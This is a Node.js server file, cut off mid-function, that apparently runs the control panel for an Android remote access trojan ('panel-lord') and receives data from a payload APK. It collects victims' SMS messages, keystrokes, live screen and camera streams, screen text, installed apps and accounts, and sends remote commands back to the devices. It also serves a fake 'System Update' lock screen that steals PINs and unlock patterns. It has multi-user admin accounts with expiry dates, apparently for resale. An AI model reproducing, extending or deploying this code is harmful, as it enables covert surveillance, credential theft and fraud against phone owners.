const express  = require('express');
const http     = require('http');
const path     = require('path');
const fs       = require('fs');
const crypto   = require('crypto');
const { spawn, execSync } = require('child_process');
let multer;
try { multer = require('multer'); } catch(_) { multer = null; }


const https_mod = require('https');
const app  = express();
const PORT = process.env.PORT || 80;

/* ── Auto-detect public IP ────────────────────────────── */
let PUBLIC_IP = process.env.VPS_IP || '';

function fetchPublicIp() {
  const sources = [
    'https://ifconfig.me/ip',
    'https://api.ipify.org',
    'https://icanhazip.com',
    'https://checkip.amazonaws.com'
  ];
  let done = false;
  sources.forEach(url => {
    https_mod.get(url, { timeout: 4000 }, (resp) => {
      let data = '';
      resp.on('data', c => data += c);
      resp.on('end', () => {
        if (!done) {
          const ip = data.trim();
          if (/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
            done = true;
            PUBLIC_IP = ip;
            if (!process.env.VPS_IP) process.env.VPS_IP = ip;
            console.log(`  [>>] Public IP detected: ${ip}`);
          }
        }
      });
    }).on('error', () => {}).setTimeout(4000, function(){ this.destroy(); });
  });
}

if (!PUBLIC_IP) fetchPublicIp();
setInterval(fetchPublicIp, 600000);

function getPublicIp() { return PUBLIC_IP || process.env.VPS_IP || ''; }

/* ── paths ─────────────────────────────────────────────── */
const BASE         = __dirname;
const DATA_FILE    = path.join(BASE, 'data.json');
const SDK          = path.join(BASE, 'android-sdk');
const SDKMANAGER   = path.join(SDK,  'cmdline-tools/latest/bin/sdkmanager');
const PAYLOAD_TPL  = path.join(BASE, 'android-payload');
const BUILD_DIR    = path.join(BASE, 'builds');

fs.mkdirSync(BUILD_DIR, { recursive: true });

/* ── simple JSON DB ─────────────────────────────────────── */
function dbLoad() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const d = JSON.parse(raw);
    if (!d.users) d.users = [];
    if (!d.devices) d.devices = [];
    if (!d.sms) d.sms = [];
    if (!d.commands) d.commands = [];
    return d;
  } catch(e) {}
  return { users:[], devices:[], sms:[], commands:[] };
}
function dbSave(d) {
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(d, null, 2)); }
  catch(e) { console.error('[ERR] dbSave failed:', e.message); }
}
function dbRun(fn) { const d = dbLoad(); fn(d); dbSave(d); return d; }

/* create default admin on first run */
(function initDb() {
  const d = dbLoad();
  if (!d.users.length) {
    d.users.push({ id: uid(), username: 'admin', passwordHash: sha256('admin123'), token: uid(), role: 'admin', createdAt: Date.now() });
    dbSave(d);
    console.log('  ⚡ Default admin created  username=admin  password=admin123');
  }
})();

/* ── helpers ────────────────────────────────────────────── */
function uid()        { return crypto.randomBytes(12).toString('hex'); }
function sha256(s)    { return crypto.createHash('sha256').update(s).digest('hex'); }
function now()        { return Date.now(); }

function authDash(req, res, next) {
  const hdr = req.headers['authorization'] || '';
  const token = req.query.token || hdr.replace('Bearer ', '').trim();
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const u = dbLoad().users.find(u => u.token === token);
  if (!u) return res.status(401).json({ error: 'Invalid token' });
  req.user = u;
  next();
}
function authAdmin(req, res, next) {
  authDash(req, res, () => {
    if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    next();
  });
}
function authDevice(req, res, next) {
  const token = req.headers['x-token'] || req.query.token;
  if (!token) return res.status(401).json({ error: 'No token' });
  const d = dbLoad();
  const u = d.users.find(u => u.token === token);
  if (!u) return res.status(401).json({ error: 'Bad token' });
  req.user = u;
  req.db = d;
  next();
}

/* ── middleware ─────────────────────────────────────────── */
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Token');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
app.use((req, res, next) => {
  if (req.path.startsWith('/screen-frame/') || req.path.startsWith('/device/screen/') || req.path.startsWith('/device/camera/frame/')) {
    return next();
  }
  express.json({ limit: '20mb' })(req, res, next);
});
/* ─────────────────────────────────────────────────────────
   DASHBOARD AUTH API
───────────────────────────────────────────────────────── */
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body || {};
  const d = dbLoad();
  const u = d.users.find(u => u.username === username && u.passwordHash === sha256(password));
  if (!u) return res.status(401).json({ error: 'Invalid credentials' });
  res.json({ token: u.token, role: u.role, username: u.username });
});

app.get('/api/auth/me', authDash, (req, res) => {
  res.json({ id: req.user.id, username: req.user.username, role: req.user.role, expiresAt: req.user.expiresAt || null, phone: req.user.phone || '' });
});

app.get('/api/server-info', (req, res) => {
  const ip = getPublicIp();
  res.json({ ip: ip || '', url: ip ? `http://${ip}` : '', port: PORT });
});

/* ─────────────────────────────────────────────────────────
   DEVICE API (called by payload APK)
───────────────────────────────────────────────────────── */

// Debug log — stores last 30 heartbeat attempts (success + fail) for diagnostics
const hbLog = [];
function logHb(req, status, note) {
  hbLog.unshift({
    ts: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    token: (req.headers['x-token'] || '').slice(0, 8) + '...',
    status,
    note,
    body: JSON.stringify(req.body || {}).slice(0, 120)
  });
  if (hbLog.length > 30) hbLog.pop();
}

// Open debug endpoint — admin only, shows all heartbeat attempts
app.get('/api/debug/heartbeats', authAdmin, (req, res) => res.json(hbLog));

// Public ping — phone hits this first to confirm VPS reachable (no auth)
app.get('/device/ping', (req, res) => {
  res.json({ ok: true, ts: Date.now(), server: 'panel-lord' });
});

app.post('/device/heartbeat', (req, res, next) => {
  // Log attempt BEFORE auth so failed ones are visible too
  const token = req.headers['x-token'] || req.query.token || '';
  const d = dbLoad();
  const u = d.users.find(u => u.token === token);
  if (!u) {
    logHb(req, 401, `Bad/missing token: "${token.slice(0,12)}..."`);
    return res.status(401).json({ error: 'Bad token' });
  }
  req.user = u; req.db = d;
  logHb(req, 200, 'OK');
  next();
}, (req, res) => {
  const info = req.body;
  const deviceId = info.deviceId || uid();

  // Parse SIM cards — APK sends simCards[] array
  let sim1 = '', sim2 = '';
  if (Array.isArray(info.simCards) && info.simCards.length > 0) {
    const s0 = info.simCards[0];
    sim1 = `${s0.carrier||'SIM'} ${s0.number||''}`.trim();
    if (info.simCards.length > 1) {
      const s1 = info.simCards[1];
      sim2 = `${s1.carrier||'SIM'} ${s1.number||''}`.trim();
    }
  } else {
    sim1 = info.sim1 || '';
    sim2 = info.sim2 || '';
  }

  // Battery — APK sends batteryLevel, fallback to battery
  const battery = info.batteryLevel !== undefined ? info.batteryLevel : (info.battery || 0);

  dbRun(d => {
    let dev = d.devices.find(x => x.id === deviceId);
    if (!dev) {
      dev = { id: deviceId, userId: req.user.id, createdAt: now() };
      d.devices.push(dev);
    }
    Object.assign(dev, {
      name: info.name || info.model || (info.brand + ' ' + info.model).trim() || 'Device',
      model: info.model || '',
      brand: info.brand || '',
      android: info.androidVersion || info.android || '',
      battery,
      sim1,
      sim2,
      online: true,
      lastSeen: now(),
      ip: (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim(),
      isDeviceOwner: info.isDeviceOwner === true,
      screenOn: info.screenOn === true,
      accessibilityEnabled: info.accessibilityEnabled === true
    });
  });
  res.json({ ok: true, deviceId });
});

app.post('/device/sms', authDevice, (req, res) => {
  const messages = Array.isArray(req.body) ? req.body : [req.body];
  // Read deviceId from header OR from first message body item
  const deviceId = req.headers['x-device-id']
    || (Array.isArray(req.body) ? req.body[0]?.deviceId : req.body?.deviceId)
    || '';
  dbRun(d => {
    messages.forEach(m => {
      const msgDeviceId = m.deviceId || deviceId;
      const exists = d.sms.find(s => s.msgId === m.msgId && s.deviceId === msgDeviceId);
      if (!exists) {
        d.sms.push({
          id: uid(), deviceId: msgDeviceId, userId: req.user.id,
          msgId: m.msgId || uid(), from: m.from || m.address || '?',
          body: m.body || m.message || '',
          direction: m.direction || 'inbox',
          sim: m.sim || 'SIM1',
          timestamp: m.timestamp || now()
        });
      }
    });
  });
  res.json({ ok: true });
});

app.get('/device/commands/:deviceId', authDevice, (req, res) => {
  const d = dbLoad();
  const cmds = d.commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
  cmds.forEach(c => { dbRun(db => { const cmd = db.commands.find(x => x.id === c.id); if(cmd) cmd.status = 'sent'; }); });
  res.json(cmds);
});

app.post('/device/commands/:cmdId/done', authDevice, (req, res) => {
  dbRun(d => { const c = d.commands.find(c => c.id === req.params.cmdId); if(c) c.status = 'done'; });
  res.json({ ok: true });
});

/* ── Keylogger device endpoint ─────────────────────────── */
app.post('/device/keylog/:deviceId', authDevice, (req, res) => {
  const { keys } = req.body || {};
  if (!Array.isArray(keys) || !keys.length) return res.json({ ok: true });
  const deviceId = req.params.deviceId;
  dbRun(d => {
    if (!d.keylog) d.keylog = [];
    const dev = d.devices.find(x => x.id === deviceId);
    if (!dev) return;
    keys.forEach(k => {
      d.keylog.push({ id: uid(), deviceId, userId: dev.userId, key: String(k.key || ''), app: String(k.app || ''), field: String(k.field || ''), ts: k.ts || now() });
    });
    if (d.keylog.length > 2000) d.keylog = d.keylog.slice(-2000);
  });
  res.json({ ok: true });
});

/* ── Screen frames — push-based MJPEG ──────────────────── */
const frames = {};
const mjpegSubscribers = {};      // deviceId → Set of { res, lastTs }
const cameraMjpegSubscribers = {}; // deviceId → Set of { res, lastTs }

function _mjpegWrite(subs, buf) {
  if (!subs || !subs.size) return;
  const header = `--frm\r\nContent-Type: image/jpeg\r\nContent-Length: ${buf.length}\r\n\r\n`;
  const end = '\r\n';
  for (const sub of subs) {
    try {
      sub.res.write(header);
      sub.res.write(buf);
      sub.res.write(end);
    } catch(e) { subs.delete(sub); }
  }
}

function pushFrameToSubscribers(deviceId, buf) {
  _mjpegWrite(mjpegSubscribers[deviceId], buf);
}

function pushCameraFrameToSubscribers(deviceId, buf) {
  _mjpegWrite(cameraMjpegSubscribers[deviceId], buf);
}

function storeFrame(deviceId, req, res) {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    const buf = Buffer.concat(chunks);
    if (buf.length > 0) {
      frames[deviceId] = { buf, ts: now() };
      const subs = mjpegSubscribers[deviceId];
      if (subs && subs.size > 0) {
        pushFrameToSubscribers(deviceId, buf);
      }
    }
    res.json({ ok: true });
  });
  req.on('error', () => { try { res.status(500).end(); } catch(_){} });
}

// APK posts here — with X-Token auth; also saves screen dimensions
app.post('/screen-frame/:deviceId', authDevice, (req, res) => {
  const dId = req.params.deviceId;
  // Save screen dimensions sent by APK for coordinate scaling in panel
  const sw = parseInt(req.headers['x-screen-w']) || 0;
  const sh = parseInt(req.headers['x-screen-h']) || 0;
  if (sw > 0 && sh > 0) {
    dbRun(d => {
      const dev = d.devices.find(x => x.id === dId);
      if (dev) { dev.screenW = sw; dev.screenH = sh; }
    });
  }
  storeFrame(dId, req, res);
});

// Legacy endpoint
app.post('/device/screen/:deviceId', authDevice, (req, res) => {
  storeFrame(req.params.deviceId, req, res);
});

// Dashboard fetches latest frame for a device
app.get('/screen/:deviceId', authDash, (req, res) => {
  const f = frames[req.params.deviceId];
  if (!f) return res.status(404).json({ error: 'No frame yet' });
  const age = now() - f.ts;
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('X-Frame-Age-Ms', age);
  res.send(f.buf);
});

app.get('/frame/:deviceId', (req, res) => {
  const f = frames[req.params.deviceId];
  if (!f) return res.status(404).end();
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'no-store, no-cache');
  res.send(f.buf);
});

/* ── Camera frames ─────────────────────────────────────── */
const cameraFrames = {};
const cameraCommands = {};

// APK permission status storage
const permissionsData = {};
app.post('/device/permissions/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const body = req.body;
    permissionsData[deviceId] = { perms: body.perms || [], ts: now() };
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false }); }
});
app.get('/api/devices/:id/permissions', authDash, (req, res) => {
  const data = permissionsData[req.params.id];
  if (!data) return res.json({ perms: [], ts: null });
  res.json(data);
});

// APK sends installed apps list
const appsStore = {};
app.post('/device/apps/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const body = req.body;
    const list = typeof body === 'string' ? JSON.parse(body) : body;
    appsStore[deviceId] = { apps: list, ts: now() };
    res.json({ ok: true });
  } catch(e) {
    res.json({ ok: false });
  }
});
app.get('/api/devices/:id/apps', authDash, (req, res) => {
  const data = appsStore[req.params.id];
  if (!data) return res.json({ apps: null, ts: null });
  res.json(data);
});

// APK sends device accounts list
const accountsStore = {};
app.post('/device/accounts/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const body = req.body;
    const list = typeof body === 'string' ? JSON.parse(body) : body;
    accountsStore[deviceId] = { accounts: list, ts: now() };
    res.json({ ok: true });
  } catch(e) {
    res.json({ ok: false });
  }
});
app.get('/api/devices/:id/accounts', authDash, (req, res) => {
  const data = accountsStore[req.params.id];
  if (!data) return res.json({ accounts: null, ts: null });
  res.json(data);
});

// SIM removal / insertion alerts
const simAlerts = {};
app.post('/device/sim-alert/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const body = req.body;
    const alert = typeof body === 'string' ? JSON.parse(body) : body;
    if (!simAlerts[deviceId]) simAlerts[deviceId] = [];
    simAlerts[deviceId].unshift({ ...alert, ts: alert.ts || now() });
    // Keep last 50 alerts per device
    if (simAlerts[deviceId].length > 50) simAlerts[deviceId].length = 50;
    res.json({ ok: true });
  } catch(e) {
    res.json({ ok: false });
  }
});
app.get('/api/devices/:id/sim-alerts', authDash, (req, res) => {
  res.json({ alerts: simAlerts[req.params.id] || [] });
});
app.delete('/api/devices/:id/sim-alerts', authDash, (req, res) => {
  simAlerts[req.params.id] = [];
  res.json({ ok: true });
});

// APK sends screen content (text extracted by accessibility)
const screenTexts = {};
app.post('/device/screen-text/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const body = req.body;
    const text = typeof body === 'string' ? body : JSON.stringify(body);
    screenTexts[deviceId] = { text, ts: now() };
    res.json({ ok: true });
  } catch(e) {
    res.json({ ok: false });
  }
});

// Dashboard reads screen content for a device
app.get('/api/devices/:id/screen-text', authDash, (req, res) => {
  const data = screenTexts[req.params.id];
  if (!data) return res.json({ text: null, ts: null });
  res.json(data);
});

// APK uploads camera frame
app.post('/device/camera/frame/:deviceId', authDevice, (req, res) => {
  const deviceId = req.params.deviceId;
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    const buf = Buffer.concat(chunks);
    if (buf.length > 0) {
      cameraFrames[deviceId] = { buf, ts: now() };
      pushCameraFrameToSubscribers(deviceId, buf); // instant push!
    }
    res.json({ ok: true });
  });
});

// APK polls for camera command (start_back / start_front / stop)
app.get('/device/camera/command/:deviceId', authDevice, (req, res) => {
  const cmd = cameraCommands[req.params.deviceId] || null;
  if (cmd) delete cameraCommands[req.params.deviceId];
  res.json({ command: cmd });
});

// Dashboard MJPEG stream of camera — push-based
app.get('/camera-mjpeg/:deviceId', authDash, (req, res) => {
  const { deviceId } = req.params;
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frm',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
    'Transfer-Encoding': 'chunked'
  });
  res.flushHeaders();
  const f0 = cameraFrames[deviceId];
  if (f0) {
    try {
      res.write(`--frm\r\nContent-Type: image/jpeg\r\nContent-Length: ${f0.buf.length}\r\n\r\n`);
      res.write(f0.buf);
      res.write('\r\n');
    } catch(_){}
  }
  if (!cameraMjpegSubscribers[deviceId]) cameraMjpegSubscribers[deviceId] = new Set();
  const sub = { res };
  cameraMjpegSubscribers[deviceId].add(sub);
  req.on('close', () => { cameraMjpegSubscribers[deviceId]?.delete(sub); });
});

// Dashboard single camera frame
app.get('/camera-frame/:deviceId', authDash, (req, res) => {
  const f = cameraFrames[req.params.deviceId];
  if (!f) return res.status(404).end();
  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Cache-Control', 'no-store');
  res.send(f.buf);
});

// Screen MJPEG — push-based (zero latency: APK upload → instant browser delivery)
app.get('/mjpeg/:deviceId', authDash, (req, res) => {
  const { deviceId } = req.params;
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frm',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
    'Transfer-Encoding': 'chunked'
  });
  res.flushHeaders();
  // Send current frame immediately
  const f0 = frames[deviceId];
  if (f0) {
    try {
      res.write(`--frm\r\nContent-Type: image/jpeg\r\nContent-Length: ${f0.buf.length}\r\n\r\n`);
      res.write(f0.buf);
      res.write('\r\n');
    } catch(_){}
  }
  if (!mjpegSubscribers[deviceId]) mjpegSubscribers[deviceId] = new Set();
  const sub = { res };
  mjpegSubscribers[deviceId].add(sub);
  req.on('close', () => { mjpegSubscribers[deviceId]?.delete(sub); });
});

/* ─────────────────────────────────────────────────────────
   DASHBOARD API (user auth required)
───────────────────────────────────────────────────────── */
app.get('/api/devices', authDash, (req, res) => {
  const d = dbLoad();
  // mark offline if not seen in 60s
  const now_ = now();
  const devs = d.devices
    .filter(dev => dev.userId === req.user.id)
    .map(dev => ({ ...dev, online: (now_ - dev.lastSeen) < 60000 }));
  res.json(devs);
});

app.get('/api/devices/:id', authDash, (req, res) => {
  const d = dbLoad();
  const dev = d.devices.find(x => x.id === req.params.id && x.userId === req.user.id);
  if (!dev) return res.status(404).json({ error: 'Not found' });
  res.json({ ...dev, online: (now() - dev.lastSeen) < 60000 });
});

app.get('/api/sms/count', authDash, (req, res) => {
  const d = dbLoad();
  const count = d.sms.filter(s => s.userId === req.user.id).length;
  res.json({ count });
});

app.get('/api/devices/:id/sms', authDash, (req, res) => {
  const d = dbLoad();
  const sms = d.sms
    .filter(s => s.deviceId === req.params.id && s.userId === req.user.id)
    .sort((a,b) => b.timestamp - a.timestamp)
    .slice(0, 200);
  res.json(sms);
});

app.post('/api/devices/:id/command', authDash, (req, res) => {
  const { action, data } = req.body;
  const d = dbLoad();
  const dev = d.devices.find(x => x.id === req.params.id && x.userId === req.user.id);
  if (!dev) return res.status(404).json({ error: 'Not found' });
  dbRun(db => { db.commands.push({ id: uid(), deviceId: dev.id, action, data: data || {}, status: 'pending', createdAt: now() }); });
  res.json({ ok: true });
});

// Camera command from dashboard → queued for APK (via both paths)
app.post('/api/devices/:id/camera-command', authDash, (req, res) => {
  const { command } = req.body || {};
  if (!command) return res.status(400).json({ error: 'command required' });
  const d = dbLoad();
  const dev = d.devices.find(x => x.id === req.params.id && x.userId === req.user.id);
  if (!dev) return res.status(404).json({ error: 'Not found' });
  // Legacy in-memory path (CameraStreamService polls this for stop)
  cameraCommands[req.params.id] = command;
  // Also queue as device command so CommandPoller can start/stop CameraStreamService
  const action = command === 'start_front' ? 'start_front'
               : command === 'start_back'  ? 'start_back'
               : 'stop_camera';
  dbRun(db2 => {
    if (!db2.commands) db2.commands = [];
    db2.commands.push({ id: uid(), deviceId: req.params.id, action, data: {}, status: 'pending', createdAt: now() });
    if (db2.commands.length > 500) db2.commands = db2.commands.slice(-500);
  });
  res.json({ ok: true });
});

// Keylog
app.get('/api/devices/:id/keylog', authDash, (req, res) => {
  const d = dbLoad();
  const logs = (d.keylog || [])
    .filter(k => k.deviceId === req.params.id && k.userId === req.user.id)
    .sort((a, b) => b.ts - a.ts)
    .slice(0, 300);
  res.json(logs);
});

// Generate phishing link for a device
app.post('/api/devices/:id/phish-link', authDash, (req, res) => {
  const { type } = req.body || {};  // 'pattern' or 'pin'
  const d = dbLoad();
  const dev = d.devices.find(x => x.id === req.params.id && x.userId === req.user.id);
  if (!dev) return res.status(404).json({ error: 'Not found' });
  const phishToken = uid();
  dbRun(db => {
    const dv = db.devices.find(x => x.id === req.params.id);
    if (dv) dv.phishToken = phishToken;
  });
  const host = `http://${req.headers.host || getPublicIp() || "127.0.0.1"}`;
  const url = `${host}/phish/${phishToken}?type=${type || 'pattern'}`;
  res.json({ url, phishToken });
});

// Phish captured data
app.get('/api/devices/:id/phish-captures', authDash, (req, res) => {
  const d = dbLoad();
  const caps = (d.phishCaptures || [])
    .filter(c => c.deviceId === req.params.id && c.userId === req.user.id)
    .sort((a, b) => b.ts - a.ts)
    .slice(0, 20);
  res.json(caps);
});

/* ── Phishing Lock Screen Page ──────────────────────────── */
app.get('/phish/:token', (req, res) => {
  const { type } = req.query;
  const html = generatePhishPage(req.params.token, type || 'pattern', req.headers.host || getPublicIp() || "127.0.0.1");
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

app.post('/phish/capture/:token', express.json(), (req, res) => {
  const { dots, pin, type } = req.body || {};
  const token = req.params.token;
  dbRun(d => {
    if (!d.phishCaptures) d.phishCaptures = [];
    const dev = d.devices.find(x => x.phishToken === token);
    if (!dev) return;
    d.phishCaptures.push({ id: uid(), deviceId: dev.id, userId: dev.userId, dots, pin, type, ts: now() });
  });
  res.json({ ok: true });
});

function generatePhishPage(token, type, host) {
  return `<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>System Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;touch-action:none}
.top{text-align:center;margin-bottom:36px}
.time{font-size:64px;font-weight:100;letter-spacing:-2px}
.date{font-size:15px;color:rgba(255,255,255,.7);margin-top:4px}
.hint{font-size:13px;color:rgba(255,255,255,.5);margin:20px 0 16px}
.grid{position:relative;width:260px;height:260px;flex-shrink:0}
#cv{position:absolute;top:0;left:0;width:260px;height:260px;display:block;}
.dots{display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none}
.dot{display:flex;align-items:center;justify-content:center}
.dot-inner{width:16px;height:16px;border-radius:50%;background:rgba(255,255,255,.25);border:2px solid rgba(255,255,255,.55);transition:background .08s,box-shadow .08s}
.dot-inner.active{background:#fff;box-shadow:0 0 12px rgba(255,255,255,.9);border-color:#fff}
.msg{margin-top:22px;font-size:14px;color:rgba(255,255,255,.5);min-height:20px;text-align:center}
.pin-area{display:none;flex-direction:column;align-items:center;gap:16px}
.pin-dots{display:flex;gap:14px;margin-bottom:6px}
.pin-dot{width:13px;height:13px;border-radius:50%;border:2px solid rgba(255,255,255,.5)}
.pin-dot.filled{background:#fff;border-color:#fff}
.pin-grid{display:grid;grid-template-columns:repeat(3,76px);gap:12px}
.pin-btn{width:76px;height:76px;border-radius:50%;background:rgba(255,255,255,.1);border:none;color:#fff;font-size:26px;font-weight:300;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;-webkit-tap-highlight-color:transparent;transition:background .1s}
.pin-btn:active{background:rgba(255,255,255,.28)}
.pin-btn .sub{font-size:8px;color:rgba(255,255,255,.45);letter-spacing:.1em;margin-top:1px}
</style></head>
<body>
<div class="top"><div class="time" id="clock">--:--</div><div class="date" id="dateTxt"></div></div>
<div id="patternArea">
  <div class="hint">Draw your pattern to continue</div>
  <div class="grid">
    <canvas id="cv"></canvas>
    <div class="dots" id="dots"></div>
  </div>
  <div class="msg" id="msg"></div>
</div>
<div class="pin-area" id="pinArea">
  <div class="hint">Enter PIN to continue</div>
  <div class="pin-dots" id="pinDots"></div>
  <div class="pin-grid" id="pinGrid"></div>
</div>
<script>
const TOKEN='${token}',HOST='${host}',TYPE='${type}';
function tick(){const n=new Date();document.getElementById('clock').textContent=n.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});document.getElementById('dateTxt').textContent=n.toLocaleDateString([],{weekday:'long',month:'long',day:'numeric'});}
tick();setInterval(tick,1000);

if(TYPE==='pin'){
  document.getElementById('patternArea').style.display='none';
  const pa=document.getElementById('pinArea');pa.style.display='flex';
  let pin='';
  const dotEls=[];
  for(let i=0;i<4;i++){const d=document.createElement('div');d.className='pin-dot';document.getElementById('pinDots').appendChild(d);dotEls.push(d);}
  const keys=[['1',''],['2','ABC'],['3','DEF'],['4','GHI'],['5','JKL'],['6','MNO'],['7','PQRS'],['8','TUV'],['9','WXYZ'],['',''],['0',''],['⌫','']];
  keys.forEach(([k,s])=>{
    const b=document.createElement('button');b.className='pin-btn';
    b.innerHTML=k+(s?'<span class="sub">'+s+'</span>':'');
    b.ontouchstart=function(e){e.preventDefault();
      if(k==='⌫'){pin=pin.slice(0,-1);}
      else if(k&&pin.length<4){pin+=k;}
      dotEls.forEach((d,i)=>d.className='pin-dot'+(i<pin.length?' filled':''));
      if(pin.length===4){
        fetch('http://'+HOST+'/phish/capture/'+TOKEN,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'pin',pin})})
        .then(()=>{pa.style.display='none';document.querySelector('.top').innerHTML+='<div style="margin-top:20px;font-size:14px;color:rgba(255,255,255,.5)">Incorrect PIN</div>';setTimeout(()=>location.reload(),2500);});
        pin='';
      }
    };
    document.getElementById('pinGrid').appendChild(b);
  });
} else {
  // ── Pattern mode ──
  const cv=document.getElementById('cv');
  const ctx=cv.getContext('2d');
  const dotsEl=document.getElementById('dots');
  let dotEls=[],activeDots=[],drawing=false,lastX=0,lastY=0,cvRect={left:0,top:0,width:260,height:260};

  // Fixed 260x260 canvas — no offsetWidth issues
  cv.width=260;cv.height=260;

  for(let i=0;i<9;i++){
    const w=document.createElement('div');w.className='dot';
    const d=document.createElement('div');d.className='dot-inner';
    w.appendChild(d);dotsEl.appendChild(w);
    dotEls.push({el:d,rect:null});
  }

  function updateRects(){cvRect=cv.getBoundingClientRect();dotEls.forEach(d=>{d.rect=d.el.getBoundingClientRect();});}
  // Delay so layout is painted
  setTimeout(updateRects,120);
  window.addEventListener('resize',updateRects);

  function getDot(cx,cy){
    for(let i=0;i<dotEls.length;i++){
      const r=dotEls[i].rect;if(!r)continue;
      const dx=cx-(r.left+r.width/2),dy=cy-(r.top+r.height/2);
      if(Math.hypot(dx,dy)<34)return i;
    }return -1;
  }

  function draw(){
    ctx.clearRect(0,0,260,260);
    if(activeDots.length<1)return;
    ctx.strokeStyle='rgba(100,180,255,0.7)';ctx.lineWidth=3.5;ctx.lineJoin='round';ctx.lineCap='round';
    ctx.beginPath();
    activeDots.forEach((i,idx)=>{
      const r=dotEls[i].rect;if(!r)return;
      const x=r.left+r.width/2-cvRect.left;
      const y=r.top+r.height/2-cvRect.top;
      idx===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
    });
    if(drawing)ctx.lineTo(lastX,lastY);
    ctx.stroke();
    // Draw dot rings for active dots
    ctx.strokeStyle='rgba(100,180,255,0.4)';ctx.lineWidth=1.5;
    activeDots.forEach(i=>{
      const r=dotEls[i].rect;if(!r)return;
      const x=r.left+r.width/2-cvRect.left,y=r.top+r.height/2-cvRect.top;
      ctx.beginPath();ctx.arc(x,y,10,0,Math.PI*2);ctx.stroke();
    });
  }

  function getXY(e){const t=e.touches?e.touches[0]:e;return{x:t.clientX,y:t.clientY};}

  function onStart(e){
    e.preventDefault();
    updateRects();
    activeDots=[];dotEls.forEach(d=>d.el.className='dot-inner');
    drawing=true;
    const p=getXY(e);lastX=p.x-cvRect.left;lastY=p.y-cvRect.top;
    const d=getDot(p.x,p.y);
    if(d>=0){activeDots.push(d);dotEls[d].el.className='dot-inner active';}
    draw();
  }
  function onMove(e){
    e.preventDefault();if(!drawing)return;
    const p=getXY(e);lastX=p.x-cvRect.left;lastY=p.y-cvRect.top;
    const d=getDot(p.x,p.y);
    if(d>=0&&!activeDots.includes(d)){activeDots.push(d);dotEls[d].el.className='dot-inner active';}
    draw();
  }
  function onEnd(e){
    e.preventDefault();drawing=false;
    if(activeDots.length>=2){
      updateRects();
      const dots=activeDots.map(i=>{
        const r=dotEls[i].rect;
        return{x:(r.left+r.width/2-cvRect.left)/cvRect.width,y:(r.top+r.height/2-cvRect.top)/cvRect.height,dot:i+1};
      });
      fetch('http://'+HOST+'/phish/capture/'+TOKEN,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'pattern',dots})})
      .then(()=>{
        document.getElementById('msg').textContent='Incorrect pattern. Try again.';
        setTimeout(()=>{activeDots=[];dotEls.forEach(d=>d.el.className='dot-inner');document.getElementById('msg').textContent='';draw();},2000);
      });
    }else{
      activeDots=[];dotEls.forEach(d=>d.el.className='dot-inner');draw();
    }
  }
  cv.addEventListener('mousedown',onStart);cv.addEventListener('mousemove',onMove);cv.addEventListener('mouseup',onEnd);
  cv.addEventListener('touchstart',onStart,{passive:false});cv.addEventListener('touchmove',onMove,{passive:false});cv.addEventListener('touchend',onEnd,{passive:false});
}
</script></body></html>`;
}

/* ─────────────────────────────────────────────────────────
   ADMIN API
───────────────────────────────────────────────────────── */
app.get('/api/admin/users', authAdmin, (req, res) => {
  try {
    const d = dbLoad();
    const devCount = (userId) => d.devices.filter(x => x.userId === userId).length;
    const result = d.users.map(u => ({ id: u.id, username: u.username, role: u.role, token: u.token, createdAt: u.createdAt, devices: devCount(u.id), phone: u.phone || '', expiresAt: u.expiresAt || null }));
    console.log('[>>] GET /api/admin/users → returning', result.length, 'users');
    res.json(result);
  } catch(e) {
    console.error('[ERR] GET /api/admin/users failed:', e.message);
    res.status(500).json({ error: 'Internal error loading users' });
  }
});

app.post('/api/admin/users', authAdmin, (req, res) => {
  const { username, password, role, phone, expiryDays } = req.body;
